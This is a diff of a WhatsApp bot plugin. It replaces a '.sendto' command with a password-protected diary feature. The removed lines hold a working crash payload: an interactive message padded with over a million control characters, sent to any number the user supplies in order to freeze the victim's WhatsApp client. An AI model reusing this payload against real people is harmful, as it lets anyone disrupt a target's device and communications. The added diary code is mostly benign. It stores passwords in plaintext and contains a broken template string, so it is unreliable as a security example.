@@ -1,55 +1,159 @@
-const config = require('../config');
-const { cmd, commands } = require('../command');
 
+
+const { cmd } = require("../command");
+const fs = require('fs');
+const path = require('path');
+
+const diaryFile = path.join(__dirname, "../data/diary.json");
+let diaries = fs.existsSync(diaryFile) ? JSON.parse(fs.readFileSync(diaryFile, 'utf8')) : {};
+
+const saveDiaries = () => {
+    fs.writeFileSync(diaryFile, JSON.stringify(diaries, null, 2));
+};
+
+// URL de l'image (remplace par une URL valide)
+const ALIVE_IMG = "https://i.ibb.co/4Zq1jCNP/lordkerm.jpg"; 
 
 cmd({
-    pattern: "sendto", // Command trigger
-    alias: ["send"], // Aliases
-    use: '.sendto <number>', // Example usage
-    react: "📤", // Emoji reaction
-    desc: "Send a test message to a specific number.", // Description
-    category: "utility", // Command category
-    filename: __filename // Current file name
-},
+    pattern: "diary2",
+    desc: "Open or create a secret diary",
+    category: "private",
+    filename: __filename
+}, async (conn, mek, m, { reply, q, from }) => {
+    const userId = m.sender;
 
-async (conn, mek, m, { from, reply, args }) => {
-    try {
-        // Extract the number from the command
-        const number = args[0];
-        if (!number) {
-            return reply("*Please provide a number to send the message to.*\n*Example:* `.sendto 263719647303`");
+    if (!diaries[userId]) {
+        if (!q) {
+            return reply("📖 You don't have a diary yet. To create one, use:\n\n`.diary yourpassword`");
         }
-
-        // Construct the message object
-        const Qrad = {
-            key: {
-                remoteJid: 'p',
-                fromMe: false,
-                participant: '0@s.whatsapp.net'
-            },
-            message: {
-                "interactiveResponseMessage": {
-                    "body": {
-                        "text": "Sent",
-                        "format": "DEFAULT"
-                    },
-                    "nativeFlowResponseMessage": {
-                        "name": "galaxy_message",
-                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
-                        "version": 3
-                    }
-                }
-            }
-        };
-
-        // Send the message to the specified number
-        await conn.sendMessage(`${number}@s.whatsapp.net`, Qrad);
-
-        // Confirm the message was sent
-        reply(`*Message sent successfully to ${number}.*`);
-
-    } catch (error) {
-        console.error("Error:", error); // Log the error
-        reply("*Error: Unable to send the message. Please try again later.*");
+        diaries[userId] = { password: q.trim(), entries: [] };
+        saveDiaries();
+        return reply(`✅ Your secret diary has been created!\nTo add an entry, use \`.setdiary your message\`\nTo open your diary, use \`.diary yourpassword\``);
     }
+
+    if (!q) {
+        return reply("🔒 You already have a diary. To open it, enter your password like this:\n\n`.diary yourpassword`");
+    }
+
+    if (q.trim() !== diaries[userId].password) {
+        return reply("❌ Incorrect password! Please try again.");
+    }
+
+    if (diaries[userId].entries.length === 0) {
+        return reply("📖 Your diary is empty. Add entries using `.setdiary your message`.");
+    }
+
+    let formattedInfo = `📖 *Your Diary Entries:*\n\n`;
+    diaries[userId].entries.forEach((entry, index) => {
+        formattedInfo += `📅 *${entry.date}* 🕒 *${entry.time}*\n📝 ${entry.text}\n\n`;
+    });
+
+    // Envoi de l'image avec la liste des entrées
+    await conn.sendMessage(from, {
+        image: { url: ALIVE_IMG },
+        caption: formattedInfo,
+        contextInfo: { 
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+                newsletterJid: '120363321386877609@newsletter',
+                newsletterName: '𝐊𝐄𝐑𝐌 𝐃𝐈𝐀𝐑𝐘',
+                serverMessageId: 143
+            }
+        }
+    }, { quoted: mek });
+});
+
+// Commande pour ajouter une entrée au journal
+cmd({
+    pattern: "setdiary",
+    desc: "Write a new diary entry",
+    category: "private",
+    filename: __filename
+}, async (conn, mek, m, { reply, q }) => {
+    const userId = m.sender;
+    if (!diaries[userId]) {
+        return reply("❌ You don't have a diary yet. Create one using `.diary yourpassword`.");
+    }
+    if (!q) {
+        return reply("✍️ Please provide the text you want to add to your diary.");
+    }
+
+    const now = new Date();
+    const date = now.toLocaleDateString('fr-FR'); // Format date (France)
+    const time = now.toLocaleTimeString('fr-FR', { hour12: false }); // Format 24h
+
+    diaries[userId].entries.push({ date, time, text: q.trim() });
+    saveDiaries();
+
+    reply("✅ Your entry has been added to your diary!");
+});
+
+// Commande pour réinitialiser le journal
+cmd({
+    pattern: "resetdiary",
+    desc: "Reset your diary (delete all entries)",
+    category: "private",
+    filename: __filename
+}, async (conn, mek, m, { reply, q }) => {
+    const userId = m.sender;
+
+    if (!diaries[userId]) {
+        return reply("❌ You don't have a diary to reset.");
+    }
+
+    if (!q) {
+        return reply("⚠️ To reset your diary, use `.resetdiary yourpassword` to confirm your identity.");
+    }
+
+    if (q.trim() !== diaries[userId].password) {
+        return reply("❌ Incorrect password! Diary reset aborted.");
+    }
+
+    delete diaries[userId];
+    saveDiaries();
+
+    reply("✅ Your diary has been successfully reset!");
+});
+const generateCode = () => Math.floor(100000 + Math.random() * 900000).toString(); // Code 6 chiffres
+let resetRequests = {}; // Stocke les codes de vérification temporaires
+
+cmd({
+    pattern: "resetpassword",
+    desc: "Reset your diary password",
+    category: "private",
+    filename: __filename
+}, async (conn, mek, m, { reply, q }) => {
+    const userId = m.sender;
+
+    if (!diaries[userId]) {
+        return reply("❌ You don't have a diary. Create one using `.diary yourpassword`.");
+    }
+
+    // Vérifier si l'utilisateur a déjà demandé un code
+    if (!q) {
+        const resetCode = generateCode();
+        resetRequests[userId] = resetCode;
+
+        await conn.sendMessage(userId, { text: `🔐 Your password reset code: *${resetCode}* \n\nEnter this code with `.resetpassword code newpassword` to confirm.` });
+        return reply("📩 A reset code has been sent to your private chat. Use it to reset your password.");
+    }
+
+    const args = q.split(" ");
+    if (args.length !== 2) {
+        return reply("⚠️ Incorrect format! Use:\n\n`.resetpassword code newpassword`");
+    }
+
+    const [code, newPassword] = args;
+    if (!resetRequests[userId] || resetRequests[userId] !== code) {
+        return reply("❌ Invalid or expired code! Request a new one with `.resetpassword`.");
+    }
+
+    // Mettre à jour le mot de passe
+    diaries[userId].password = newPassword.trim();
+    saveDiaries();
+    delete resetRequests[userId];
+
+    reply("✅ Your diary password has been successfully reset!");
 });
